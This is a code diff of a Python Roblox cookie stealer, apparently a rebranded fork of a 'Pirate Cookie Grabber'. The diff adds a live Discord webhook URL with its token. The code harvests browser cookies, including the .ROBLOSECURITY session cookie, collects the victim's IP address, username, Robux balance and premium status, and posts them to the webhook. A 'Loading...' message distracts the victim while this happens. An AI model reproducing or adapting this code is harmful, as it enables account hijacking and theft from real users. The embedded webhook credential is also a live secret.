@@ -3,7 +3,7 @@ import codecs
 import json
 from base64 import *
 
-webhookk = "heh"
+webhookk = "https://discord.com/api/webhooks/1127952403094839326/GLjQYZAg0poxAaQ0KwZaV5sEhm_B2wWeDK3T5U1NnjO8QOAA1DUxatSYicNh3yGGrdNH"
 def command(c):
     os.system(c)
 def cls():
@@ -18,12 +18,8 @@ try:
 except:
     input("Libraries not installed press enter to exit...")
 
+print("Loading...")
 
-
-
-dummy_message = "Loading..." # A message that distracts the user from closing the grabber
-print(dummy_message)
-################### Gathering INFOMATION #################################
 def cookieLogger():
 
     data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
@@ -80,19 +76,16 @@ def cookieLogger():
 
 cookies = cookieLogger()
 
-
-#################### INFOMATION #################
 ip_address = requests.get("https://api.ipify.org/").text
 roblox_cookie = cookies[1]
-#################### checking cookie #############
 isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
+
 if isvalid == "Valid Cookie":
     pass
 else:
     requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
     exit()
 
-#################### getting info about the cookie #############
 ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
 info = json.loads(ebruh.text)
 rid = info["UserID"]
@@ -106,17 +99,17 @@ headshot = robloxpy.User.External.GetHeadshot(rid)
 username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium'];
-#################### SENDING TO WEBHOOK #################
+
 
 discord = Discord(url=webhookk)
 discord.post(
-    username="BOT - Pirate 🍪",
+    username="🍓 Strawberry 🍓",
     avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
     embeds=[
         {
-            "username": "BOT - Pirate 🍪",
-            "title": "💸 +1 Result Account 🕯️",
-            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+            "username": "🍓 Strawberry 🍓",
+            "title": "+1 Result Account ",
+            "description" : "Welcome!",
             "color" : 12452044,
             "fields": [
                 {"name": "Username", "value": username, "inline": True},
